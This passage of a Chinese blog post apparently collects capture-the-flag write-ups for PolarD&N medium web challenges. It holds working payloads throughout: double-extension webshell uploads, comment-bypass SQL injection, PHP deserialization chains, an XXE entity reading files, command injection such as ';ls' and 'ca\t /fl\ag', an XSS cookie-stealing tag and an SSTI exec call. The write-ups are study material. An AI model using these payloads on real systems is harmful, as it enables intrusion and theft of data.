AAAAEclPAAAAAEQkPwEAAAAQkfwEAAAAQETyEwAAAAARyU8AAAAARCQ&#x2F;AQAAABCR&#x2F;AQAAABARPITAAAAABHJTwAAAABEJD8BAAAAEJH8BAAAAEBE8hMAAAAAEclPAAAAAEQkPwEAAAAQkfwEAAAAQETyEwAAAAARyU8AAAAARCQ&#x2F;AQAAABCR&#x2F;AQAAABARPITAAAAABHJTwAAAABEJD8BAAAAEJH8BAAAAEBE8hMAAAAAEclPAAAAAEQkPwEAAAAQkfwEAAAAQETyEwAAAAARyU8AAAAARCQ&#x2F;AQAAABCR&#x2F;AQAAABARPITAAAAABHJTwAAAABEJD8BAAAAEJH8BAAAAEAUVVVVQX4CAAAAIKq0qqqq6hAFAAAAAM0uI5FItPQaAAAAADhiufkOAAAAgIjkJwAAAACiqL7rLq32CwAAAABoisRuNe&#x2F;svftJhwIAAACg6WoqU1rtt7QnAAAAAJqi9u6n6v&#x2F;IqHlRc0ZLLhAAAACAj7N9K9OeZz&#x2F;te2MeAAAAAByQ6r6UlpZW05r2vvlOfgIAAADgoNW+8676nYzaG6Kq01QI4Zxzzoky&#x2F;86NK98t3dLoaWmtO3XtntOx1f5K2La176xYn&#x2F;KE7br1Pbpjegg7P3xv2eptIYSQPCr3mM7JVMfv+PC9ZWs+CiGERNbR&#x2F;XIyE01Yw27NcBFCCKGqfGPpqjUfbq+qb3zmUT16dG5ba+JQsfH9pau3prrukJ177FFtUj4bAAAAIISQlpZWvfUp1Dz7qfbh6reGDBlSUVFRVVVVWVlZVVcIofZ&#x2F;HPD8Hy1fPm9xdbjplT+mf8daRzaXbli3puT9dR&#x2F;tDCGE9evWbBg0+szBnff+Zb6wvuzV+dWfkH3syfndG8kjae07H5WZFkI4akfJotfXhRDCps7HnZDfdZ&#x2F;P3a8Nby9cWbYlhBDaDRkxMDeraWvYpRkuQqhct3DGvMVlO0MIIb1t977HdD+qS8e2YdvGVR8sL3lv3fbqVa7bkn&#x2F;O2f071Izavvy9194uCyGEcHT+6LzsRr5966ycDq0aOQcAAAD4e1S7LoVau5pq2lNtGTVjarY+VauqqkokEvuGp4NvTyGEjPRE2LXbqkOX7j261D7WPYQwvGrbB2&#x2F;M&#x2F;N8lm0Ko3LBozsKe5w3tsld7SU&#x2F;b&#x2F;QltO3fv0TPV3TkdjxnQ+&#x2F;WXV4QQdhYvW31ij94pdJWqDaXLtiZCIoTQ5bhjumTUpLqDXMMuTb8Ilevmz1u8YWciEdJ7jDjztLysmi1SPXoeM3DYyLLlRa&#x2F;Ofbcs9M&#x2F;vn51RKzDuTE+r&#x2F;johdMjp2b3OzAAAAAAHonZ4qq12gao+c9fNd9WxqXpM9RkN56dwcAUqLa3m0VKJ9PT09H3PaNdr5Fmjtk6dtXJnCFve&#x2F;r8PTuyWWzcUpe&#x2F;5hLT9f8T+tc09buCcFUt2hhCWryw95ZjcRvtT5aplC7aGkAgh9B7Yt2OtqQ52DdWafBF2rHhnwaYQEqH9cZ8cO&#x2F;CoffZGpXfJO+XTuYPKtrfPbl3n4J76FA5i3QAAAAC77PU0p30L1P53P1X&#x2F;R1paWn232tXe93SQu5&#x2F;SE3v6R1p9&#x2F;aNd3vEDXlm5aGcIoWTdulF9j65zWlpaqPl6B5RQ0nvmHd9hSdGmEELJO8uH9R3YoeHzd5QU&#x2F;19FSIQQMo4beEzb2jMd9BqqF9LEi7Dj&#x2F;fdXVFexPr16tKpv8vTsLvvsykpPJMKuqRP1zgwAAACQgtrPF99vhNqTn2p2P4VaEapadYoK9bSng9z9tKd&#x2F;1L7Vr64OWd1DWBlCCFu27UhLq7NPaa9PSO0ZTtW69j2+a9HLa0IIaxeVfDjohAaffbRp+eLl1RO1z8&#x2F;r0arOPE1YQ2j6Ragq37F7eKsDm7z2vqsDXzcAAADALnu1p7DPc6D23v1UU51qbsFrdIIUz9xb2p67&#x2F;uo+aaq+0&#x2F;bNO7U&#x2F;oYGP2K+OeYP7vPxCSQhh01tLS084uXv9o9e&#x2F;t2hN9URdh+R13Wuapqyh6RchkbZ7+9SWrRV7xbmGJRI1T506iHUDAAAA7FE7j4T681MI4f8DJvumDiY3fxgAAAAASUVORK5CYII&#x3D;)"></p>
+<p>当用文件目录遍历到了敏感文件时，可以用<code>SplFileObject</code>类，同样通过echo触发<code>SplFileObject</code>中的<code>__toString()</code>方法。(该类不支持通配符，所以必须先获取到完整文件名称才行)</p>
+<p>除此之外其实<code>SplFileObject</code>类，只能读取文件的第一行内容，如果想要全部读取就需要用到foreach函数，但若题目中没有给出foreach函数的话，就要用伪协议读取文件的内容。</p>
+<p>例如：SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;<strong>read</strong>&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</p>
+<h1 id="你的马呢"><a href="#你的马呢" class="headerlink" title="你的马呢"></a>你的马呢</h1><p>进入题目让我们传文件，php有关的后缀都ban了，这里传图片是可以的</p>
+<p>但是这里又会提示你相传马不可能，这里对传的内容也有过滤，那么这里就把php换成&#x3D;</p>
+<p>但是我正常按流程来还是搞了很久；</p>
+<p>后面看了下wp发现这里是用的双后缀绕过，因为这里我们传一个1.png他会显示png恭喜你，那这里会不会是严格检查末尾但是对前面检查不严呢</p>
+<p>就改为了1.php.png，程序会检查你最后的后缀，符合了让你通过，然后apache看见你的php标签就会当做代码来执行</p>
+<p>Apache 是怎么“看文件”的？（非常关键）</p>
+<p>Apache 处理文件时，<strong>有两套完全不同的逻辑</strong>：</p>
+<ol>
+<li><strong>应用层代码（PHP）</strong><ul>
+<li>只看到：<code>xxx.jpg</code></li>
+<li>只做字符串判断</li>
+</ul>
+</li>
+<li><strong>Apache 解析器</strong><ul>
+<li>看的是：<strong>最后一个“可解析后缀”</strong></li>
+<li>或者根据 <code>AddType / AddHandler</code> 配置决定</li>
+</ul>
+</li>
+</ol>
+<p>📌 <strong>这两者经常不一致</strong>，漏洞就从这里诞生</p>
+<blockquote>
+<p>虽然文件内容中包含 PHP 一句话木马，但由于上传文件以 <code>.png</code> 结尾，服务器将其作为静态图片资源处理，不会交由 PHP 解析执行，因此无法触发代码执行。</p>
+</blockquote>
+<p>所以传了之后正常步骤就拿到flag了</p>
+<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>进题看见这样的提示，我就拿dirsearch扫了一下</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260129235112862.png" alt="image-20260129235112862"></p>
+<p>访问了robots.txt</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260129233857372.png" alt="image-20260129233857372"></p>
+<p>然后访问了一下flie</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260129235016175.png" alt="image-20260129235016175"></p>
+<p>看见源码，这里要用get方法给filename传参然后文件包含，这里有一个点是这里要稍微记一下路径因为这里有个文件包含而我们传的马显然是不在我们当前的这个目录的</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260129234618975.png" alt="image-20260129234618975"></p>
+<p>我们又区访问uploads，我就传的上面那道题一样的马</p>
+<p>然后这里要记着，因为我们我们上面的file是index of file而这里拼一下那么最终的路劲就应该是index of &#x2F;uploadsd&#x2F;image&#x2F;6.php.png</p>
+<p>那么我就先..&#x2F;到index区然后再跟上&#x2F;uploadsd&#x2F;image&#x2F;6.php.png</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260129234502416.png" alt="image-20260129234502416"></p>
+<p>最后蚁剑连的就是网址加上剑连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file/file.php?filename=../uploads/images/6.php.png</span><br></pre></td></tr></table></figure>
+
+<p>这里找flag找老半天，最后在home最里面找到</p>
+<h1 id="phpurl"><a href="#phpurl" class="headerlink" title="phpurl"></a>phpurl</h1><p>文件里面解码了就是index.phps</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260130002354053.png" alt="image-20260130002354053"></p>
+<p>这里会在浏览器本身就会解码的基础上再加一次解码，而无论怎么说最后都是字符串类型的，所以这里弱比较左右两边都是字符串类型所以这里就不会涉及到类型自动转换了</p>
+<p>这里直接xxs编两次码就可以了</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260130002307985.png" alt="image-20260130002307985"></p>
+<h1 id="随机值-取址赋值"><a href="#随机值-取址赋值" class="headerlink" title="随机值(取址赋值)"></a>随机值(取址赋值)</h1><p>进入题目看题目</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260130165227072.png" alt="image-20260130165227072"></p>
+<p>这里有一个很关键的地方在于会赋值一个随机值给polar2但是任然要求polar1和他全等，那么这里要用的就是一个叫做__<strong>取址赋值</strong>__的东西了</p>
+<p>$a&#x3D;$b</p>
+<ul>
+<li><p>普通赋值：</p>
+<p>-直接创建一个新的地址把b的值放进去也就是说他们的值只是暂时相等，一旦b发生变化那么这里的a是做不到即使变化的</p>
+</li>
+<li><p>取址赋值$a&#x3D;&amp;$b</p>
+<p>-直接把b的地址给a，那么一旦b发生了变化那么a也跟着一起变化</p>
+</li>
+</ul>
+<p>知道了这个方法之后这个题就简单了，下面是poc</p>
+<p>但是这里还有几个小点是我们不能直接$this放在类的顶层里，我们需要把它放在一个函数或者方法里面才可以</p>
+<p>然后这里还有个点在于由于几个变量是私有属性和保护熟悉那么我们直接echo的话是看不见的且无法复制到，那么我们就需要url编码一次</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260130165143850.png" alt="image-20260130165143850"></p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260130165130685.png" alt="image-20260130165130685"></p>
+<h1 id="file"><a href="#file" class="headerlink" title="file"></a>file</h1><p>进题提示我们拿dirsearch扫一下，扫到了如下</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260130171336160.png" alt="image-20260130171336160"></p>
+<p>然后就访问upload.php上传了一个马，但是这里上传了就没了，想到了还有个·uoloaded还没看</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260130171417198.png" alt="image-20260130171417198"></p>
+<p>然后访问一下uploaded得到了这个界面</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260130171347711.png" alt="image-20260130171347711"></p>
+<p>把路径保存好去蚁剑就可以了</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260130171403361.png" alt="image-20260130171403361"></p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260130171611213.png" alt="image-20260130171611213"></p>
+<h1 id="search"><a href="#search" class="headerlink" title="search"></a>search</h1><p>就一道正常的sql注入的题，但是这里把空格过滤了所以用&#x2F;**&#x2F;代替，加上一些大小写混写</p>
+<p><strong>1’&#x2F;*<em>&#x2F;Union&#x2F;*</em>&#x2F;Select&#x2F;*<em>&#x2F;1,group_concat(table_name),3,4,5&#x2F;*</em>&#x2F;From&#x2F;*<em>&#x2F;information_schema.tables&#x2F;*</em>&#x2F;Where&#x2F;**&#x2F;table_schema&#x3D;database()#</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/Union/**/select/**/1,group_concat(Flag),3,4,5/**/From/**/Flag#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260130180822091.png" alt="image-20260130180822091"></p>
+<h1 id="play-game"><a href="#play-game" class="headerlink" title="play game"></a>play game</h1><p>进入题目看见源码</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260131201047355.png" alt="image-20260131201047355"></p>
+<p>这里的关键点在于file_get_contents()文件读取，也就是说这里会读取gameFile的值，那么我们把它的值设为&#x2F;flag;</p>
+<p>然后我们再看这里唯一会用到opengame这个函数的是tostring，而要tostring那么就得要echo，而echo呢会连续进行调用</p>
+<p>那我们把user赋值new User，因为只有那个类有name，然后我们再把name赋值new playgame，实现调用playgame里面的tostring，这样我们就实现了文件的读取</p>
+<p>poc：</p>
+<?php
+**class** **User**{
+    **public** $name;
+    **public** $age;
+    **public** $sex;
+}
+**class** **PlayGame**{
+    **public** $user;
+    **public** $gameFile="/flag";
+}
+$a = **new** **PlayGame**();
+$a->user = **new** **User**();
+$a->user->name = **new** **PlayGame**();
+**echo** **serialize**($a);
+
+这里不准有下划线，那中括号就可以了
+
+?polar[flag.flag=O:8:"PlayGame":2:{s:4:"user";O:4:"User":3:{s:4:"name";O:8:"PlayGame":2:{s:4:"user";N;s:8:"gameFile";s:5:"/flag";}s:3:"age";N;s:3:"sex";N;}s:8:"gameFile";s:5:"/flag
+
+
+
+# csdn
+
+
+
+进题提示我们flag在flag.txt里面，感觉这里考的是文件包含的东西
+
+index.php?xxs=https://blog.csdn.net/
+
+那这里应该就是给xxs传参了，然后我一开始用的伪协议失败了
+
+然后这里直接用基础的的file伪协议就可以了
+
+File///flag.txt
+
+
+
+
+
+# dragon
+
+抓包直接cookie里面就是
+
+上网还看了种方法是这里用xss，然后这里的script是被ban了的，大小写双写都不行，这里用的是img来做
+
+<img src=0 onerror=alert(document.cookie)>
+
+
+
+
+
+
+
+# tnl
+
+![image-20260131213704186](/images/ctf/polar中等/image-20260131213704186.png)
+
+进题就是这样的，瞎试了几下感觉这是sql注入，但是后面尝试了一下发现并不是
+
+抓包看了一下这里我们传的参都会给twothree这个参数
+
+
+
+这里用了下伪协议想读源码也不行，想了很久这里有没有可能把后缀不要了试试
+
+
+
+php://filter/read=convert.base64-encode/resource=index
+
+得到源码
+
+![image-20260131215939178](/images/ctf/polar中等/image-20260131215939178.png)
+
+
+
+试了直接伪协议去读还成了
+
+php://filter/read=convert.base64-encode/index/resource=flag
+
+
+
+# 你知道sys还能这样玩吗
+
+进入题目长这样
+
+![image-20260131215151374](/images/ctf/polar中等/image-20260131215151374.png)
+
+
+
+
+
+抓包，扫描都干了，没有什么头绪，卡这儿
+
+上网看了下wp
+
+这里得用sys.php去访问得到源码
+
+![image-20260131215250473](/images/ctf/polar中等/image-20260131215250473.png)
+
+这里连反斜杠都没屏蔽，直接l\s /
+
+![image-20260131215337087](/images/ctf/polar中等/image-20260131215337087.png)
+
+cat一下
+
+Ca\t /fl\ag.txt
+
+
+
+
+
+# Exx
+
+![image-20260131221904472](/images/ctf/polar中等/image-20260131221904472.png)
+
+进来了有个phpinfo
+
+点进去找到了个flag估计都是错的，放进去一试果然是错的
+
+扫了一下有个dom.php，有预感是不是又是xxe
+
+![image-20260131221745337](/images/ctf/polar中等/image-20260131221745337.png)
+
+果然是xxe
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line"> &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flagggg.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+就有了
+
+
+
+
+
+# ezhost
+
+进来看见这个页面
+
+![image-20260131222815497](/images/ctf/polar中等/image-20260131222815497.png)
+
+乱输了一个发现这里应该和那个ping那道题一样
+
+传一个?host=1.1.1;ls
+
+就有flag目录了
+
+cat一下就有了
+
+
+
+# 传马
+
+很基础的文件上传
+
+我还是用的之前那个6.php.png
+
+然后在蚁剑里面连就可以了
+
+![image-20260131224424313](/images/ctf/polar中等/image-20260131224424313.png)
+
+
+
+​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+
+
+
+# 笑傲上传
+
+
+
+
+
+![image-20260201190509683](/images/ctf/polar中等/image-20260201190509683.png)
+
+应该是传马，传了个直接连，连不上
+
+看源码有个include.php
+
+![image-20260201190613425](/images/ctf/polar中等/image-20260201190613425.png)
+
+
+
+这里有include函数，那我们就在这里直接传路径然后连蚁剑
+
+![image-20260201190656027](/images/ctf/polar中等/image-20260201190656027.png)
+
+
+
+
+
+
+
+
+
+
+
+# 序列一下
+
+很基础的一道题
+
+![image-20260131225735437](/images/ctf/polar中等/image-20260131225735437.png)
+
+这里直接把1t赋值成system然后把b赋值成命令就可以了
+
+
+
+
+
+
+
+
+
+# xxmmll
+
+看这个题目这里应该要用xml
+
+
+
+![image-20260131231201820](/images/ctf/polar中等/image-20260131231201820.png)
+
+没什么东西，抓包看见了一个xxmmll.php访问一下
+
+
+
+然后就是这样一个页面
+
+![image-20260131231317702](/images/ctf/polar中等/image-20260131231317702.png)
+
+结合题目是xml，试了下随便输入一个xml文本结果flag直接出来了
+
+<?xml version="1.0" encoding="UTF-8"?><p> <ks> <Message>12</Message> </ks></p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260131231453031.png" alt="image-20260131231453031"></p>
+<h1 id="赌王"><a href="#赌王" class="headerlink" title="赌王"></a>赌王</h1><p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201162141017.png" alt="image-20260201162141017"></p>
+<p>进题让我们摇一样的才可以给提示，摇了几次都不行，那这里直接爆破了</p>
+<p>爆破成功后让我们去ed3d2c21991e3bf5e069713af9fa6ca</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201162745949.png" alt="image-20260201162745949"></p>
+<p>这里输什么也不行，看来常规的方法是不行的，但是这里是输入框我就想了下xss</p>
+<p><scrript>alert(‘1’)</script></p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201162903517.png" alt="image-20260201162903517"></p>
+<p>然后就是把alert里面的内容换成confirm()就可以了，要我们再去一个目录e744f91c29ec99f0e662c9177946c627</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201163101061.png" alt="image-20260201163101061"></p>
+<p>然后随便输了几个不行，打开f12</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201163201394.png" alt="image-20260201163201394"></p>
+<p>解码一下得到提示我们这是个地址，然后想到了之前的xff</p>
+<p>抓包之后加个X-Forwarded-For：1.1.1.1就可以了</p>
+<h1 id="coke的登录"><a href="#coke的登录" class="headerlink" title="coke的登录"></a>coke的登录</h1><p>进入题目</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201000115483.png" alt="image-20260201000115483"></p>
+<p>点开提示</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201000127116.png" alt="image-20260201000127116"></p>
+<p>然后在首页f12看了下有一个cookies.php</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201000301820.png" alt="image-20260201000301820"></p>
+<p>登录拿到flag</p>
+<h1 id="bllbl-rce"><a href="#bllbl-rce" class="headerlink" title="bllbl rce"></a>bllbl rce</h1><p>进去了有一个输入框，输了下怎么都是no</p>
+<p>拿dirsearch扫到了个admin&#x2F;admin.php</p>
+<p>进去下载</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201000715177.png" alt="image-20260201000715177"></p>
+<p>这里必须要求有bllbl,那我们的payload把命令拼在后面就可以了</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201000754368.png" alt="image-20260201000754368"></p>
+<h1 id="真假rce"><a href="#真假rce" class="headerlink" title="真假rce"></a>真假rce</h1><p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201001036111.png" alt="image-20260201001036111"></p>
+<p>就一道基础题</p>
+<p>ca\t &#x2F;f\lag</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201001058728.png" alt="image-20260201001058728"></p>
+<h1 id="nukaka-ser2"><a href="#nukaka-ser2" class="headerlink" title="nukaka_ser2"></a>nukaka_ser2</h1><p>进题看见题目</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201191332939.png" alt="image-20260201191332939"></p>
+<p>有了个大概的想法，这里VulnerableClass类里面desstrcut有一个echo，这个echo可以触发tostring()，我们在这里只要把debugmode的值改成true就可以实现，再把logger设成flagreader执行读取flag</p>
+<p>官方的wp是</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201165929883.png" alt="image-20260201165929883"></p>
+<p>这里其实在这种情况下我觉得有点麻烦了</p>
+<p>这里用了很多php内置函数去修改值，因为debugmode的属性问题这里我们直接类外面改是改不了的，这里就用的内置函数去改</p>
+<p>这里用到的是__php反射机制__，核心作用是：<strong>让我们的代码能 “透视”、“操作” 任意类 &#x2F; 对象的「所有内部结构」</strong>—— 包括普通代码根本碰不到的<strong>私有属性（private）</strong>、<strong>受保护属性（protected）</strong>、<strong>私有方法（private function）</strong>。</p>
+<p>可以把反射机制理解为：PHP 官方给的 <strong>「类的解剖刀 &#x2F; 透视镜」</strong>，普通代码只能看到类的 “表面（公有成员）”，反射能直接看到类的 “五脏六腑（所有成员）”，还能动手修改。</p>
+<p>所有对类 &#x2F; 对象的透视、操作，都要先创建<code>ReflectionClass</code>的实例（对象）</p>
+<p>然后使用getproperty专门用来「从绑定的类 &#x2F; 对象中，根据属性名获取对应属性的「属性对象」」的工具</p>
+<p>这里的getproperty并不是我一开始想的直接得到值</p>
+<ul>
+<li><code>getProperty()</code>：负责 <strong>“找属性”</strong>—— 根据属性名定位到目标属性，返回这个属性的<strong>操作手柄（ReflectionProperty 对象）</strong>，这是所有后续操作的**前提 **；</li>
+<li><code>setAccessible()</code>：负责 <strong>“解限制”</strong>—— 通过操作手柄，临时解除属性的访问权限；</li>
+<li><code>getValue()</code>：负责 <strong>“读值”</strong>—— 通过操作手柄，读取属性的当前值；</li>
+<li><code>setValue()</code>：负责 <strong>“改值”</strong>—— 通过操作手柄，修改属性的当前值。</li>
+</ul>
+<p>也就是说其实这里getproperty就是打开门的工具</p>
+<p>setaccessible相当暂时改变这个变量的访问属性，最后用setvalue来赋值</p>
+<p>但这里我们有整段代码其实我们可以直接在类里面改的，反射法倒是在任何情况都可以用，只不过这种情况下可能就比较麻烦了</p>
+<?php // 第一步：复制靶场的原始类代码到本地 // 原始靶场类：private $debugMode = false; 
+
+class VulnerableClass {    
+
+// 第二步：本地直接修改——把private改成public，值改成true    
+
+public $debugMode = true;     
+
+public $logger;     
+
+public function __destruct() {       __
+
+__ if ($this->debugMode) {            echo $this->logger; // 触发读flag        }    } 
+
+}
+
+
+
+ 
+
+class FlagReader {   
+
+ public function __toString() {        return file_get_contents('/flag.txt');    } 
+
+} // 第三步：初始化对象，给公有属性$logger赋值
+ $payload = new VulnerableClass(); 
+
+$payload->logger = new FlagReader(); // 这一步和之前一致 // 第四步：直接序列化，得到最终Payload 
+
+$final_payload = serialize($payload); 
+
+echo $final_payload; // 输出的序列化字符串，和反射法得到的完全一样 ?>
+
+
+
+<h1 id="你也玩铲吗"><a href="#你也玩铲吗" class="headerlink" title="你也玩铲吗"></a>你也玩铲吗</h1><p>进入题目注册一下</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201164706650.png" alt="image-20260201164706650"></p>
+<p>注册之后提示我们身份不够，f12里面有一句话</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201164814915.png" alt="image-20260201164814915"></p>
+<p>这里应该是要base64编码</p>
+<p>扫一下有个login_admin.html</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201164926410.png" alt="image-20260201164926410"></p>
+<p>这里用到的是伪造cookie，先把user::adminbase64编码然后给auth</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201165018205.png" alt="image-20260201165018205"></p>
+<h1 id="polarcms"><a href="#polarcms" class="headerlink" title="polarcms"></a>polarcms</h1><p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201172659352.png" alt="image-20260201172659352"></p>
+<p>进来长这样</p>
+<p>然后联系管理员</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201172722232.png" alt="image-20260201172722232"></p>
+<p>登录，这里要求特殊字符</p>
+<p>有个文件上传搞了半天都不行，后面知道了这里要用ssti</p>
+<p>去到编辑，这里用到的是java</p>
+<p>${exec(‘ls &#x2F;‘)</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201173021853.png" alt="image-20260201173021853"></p>
+<p>${exec(‘cat &#x2F;flag’)</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201173043247.png" alt="image-20260201173043247"></p>
+<h1 id="Squirtle的论坛"><a href="#Squirtle的论坛" class="headerlink" title="Squirtle的论坛"></a>Squirtle的论坛</h1><p>进来长这样</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201173247631.png" alt="image-20260201173247631"></h1><p>一下没啥头绪，拿dirsearch扫一下，有个admin.php，进不去</p>
+<p>但是那个温馨提示说master只能是squirtle，也许是cookie伪造</p>
+<p>试了下果然是</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201173441320.png" alt="image-20260201173441320"></p>
+<p>然后传马就是了</p>
+<p>flag{PolarD&amp;N_YYDS}</p>
+<h1 id="黑狗子的舔狗日记"><a href="#黑狗子的舔狗日记" class="headerlink" title="黑狗子的舔狗日记"></a>黑狗子的舔狗日记</h1><p>进去之后是个朋友圈，不知道干啥，然后看见url那里有个?page，感觉这里可以用伪协议</p>
+<p>？page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201181855203.png" alt="image-20260201181855203"></p>
+<p>这里我们可以看见源码了</p>
+<p>flag那里解码一下：</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201181931497.png" alt="image-20260201181931497"></p>
+<p>但是没有名字</p>
+<p>试试拿了dirsearch扫，扫到了个<a target="_blank" rel="noopener" href="http://www.zip,里面都是密码,显然这里要爆破/">www.zip，里面都是密码，显然这里要爆破</a></p>
+<p>然后登录，得到名字是柳茹烟</p>
+<h1 id="polar快递"><a href="#polar快递" class="headerlink" title="polar快递"></a>polar快递</h1><p>进去是这样</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201182339287.png" alt="image-20260201182339287"></p>
+<p>点开那个备忘录里面有账号密码polar 123123</p>
+<p>进去了但是没啥东西，之前备忘录里面还有管理员账户等，这里想登管理员账户，但是改用户名这些都没用</p>
+<p>抓包才看见还有个id，我一开始改的admin不行，改成root可以</p>
+<h1 id="狗黑子的跳转"><a href="#狗黑子的跳转" class="headerlink" title="狗黑子的跳转"></a>狗黑子的跳转</h1><p>进题目那个按键一直按不到，看源码这里要一个post请求，构造一个就可以了，但是这里也有直接源码那里给改了，直接禁用javascript</p>
+<p>进到一个文件上传的地方，我还是直接拿6.php.png直接传上去了但是连不上</p>
+<p>但是此时url有参数，同样想办法伪协议读源码</p>
+<p>?gou&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ghzgouheizi.php</p>
+<p>得到源码解码之后有这么一段</p>
+<p>$originalName &#x3D; $file[‘name’];</p>
+<p>base64Name&#x3D;base64encode(originalName);</p>
+<p>md5Name&#x3D;md5(base64Name);</p>
+<p>$filename &#x3D; $md5Name . ‘.’ . $ext;</p>
+<p>也就是说我们上传的文件这里会先被base64编码然后md5加密</p>
+<p>连接蚁剑就可以了</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201183915492.png" alt="image-20260201183915492"></p>
+<h1 id="aa"><a href="#aa" class="headerlink" title="aa"></a>aa</h1><p>进题没东西，dirsearch扫一下有个i.php</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201184139157.png" alt="image-20260201184139157"></p>
+<p>这里的flag是被拼接的，第一个是base64编码了，然后取整，其实我这里直接复制粘贴再加个echo flag就有了，总之就是按照他的来</p>
+<h1 id="polar-shop"><a href="#polar-shop" class="headerlink" title="polar shop"></a>polar shop</h1><p>进入题目发现我们只有一个积分</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201184633444.png" alt="image-20260201184633444"></p>
+<p>抓包的时候发现是可以的改的</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201184709217.png" alt="image-20260201184709217"></p>
+<p>把所有都兑换了</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201184730804.png" alt="image-20260201184730804"></p>
+<p>这个一眼爆破应该还有一个登录页面，dirsearch扫一下有个admin.php</p>
+<p>刚才那根文本得出这里应该名字就叫Squirtle，然后剩下的密码爆破就是了</p>
+<p>密码是5qu1rtle</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260201184915405.png" alt="image-20260201184915405"></p>
+<p>还是看不见这里卡这了，后面知道这里还是和cookie有关</p>
+<p>伪造cookie把user的值改为Squirtle</p>
+<p>flag{d104c607a29d48eb99f2eece12281a7f}</p>
